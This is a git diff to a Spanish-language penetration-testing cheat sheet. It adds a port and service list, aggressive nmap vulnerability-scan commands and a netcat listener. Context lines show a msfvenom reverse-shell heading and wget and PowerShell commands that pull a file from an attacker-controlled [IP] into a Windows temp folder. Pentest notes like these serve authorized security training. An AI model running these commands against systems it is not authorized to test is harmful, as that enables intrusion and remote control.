@@ -42,7 +42,37 @@ Fases del hacking:
 4-Post-explotación
 5-Informe
 
+25 - SMTP
+22 - SSH
+110 - POP3
+143 - IMAP
+80 - HTTP
+443 - HTTPS
+8080, 8081 - HTTP Proxy
+137, 138, 139 - NETBIOS
+115 - SFTP
+23 - Telnet
+21 - FTP
+3389 - RDP
+3306 - MySQL
+1433 - MS SQL Server
+445 - SMB
+123 - NTP
+179 - BGP
+69 - TFTP
+88 - Kerberos
+102 - MS Exchange
+53 - DNS
+5985 - winRM HTTP
+5986 - winRM HTTPS
+
 Basic Commands:
+
+- Nmap [Escaneo de puertos]
+
+sudo nmap -A -T4 -sC -sV -p- <RHOST> # Escanea Sistema Operativo y Servicios, Modo Agresivo, Escanea con una lista default de scripts pertenecienetes a nmap, Detecta servicios y versiones y escanea todos los puertos
+sudo nmap -sV -sU <RHOST> # Detecta servicios y versiones y realiza escaneo UDP
+sudo nmap -A -T4 -sC -sV --script vuln <RHOST> # Escanea Sistema Operativo y Servicios, Modo Agresivo, Escanea con una lista default de scripts pertenecienetes a nmap, Detecta servicios y versiones y lanza todos los scripts de deteccion de contenido NSE
 
 - Reverse Shell msfvenom
 
@@ -67,3 +97,7 @@ wget http://[IP]/recurso
 # Para Windows:
 
 powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+
+- Netcat [Poner x puerto en escucha]
+
+nc -nlvp <Port>
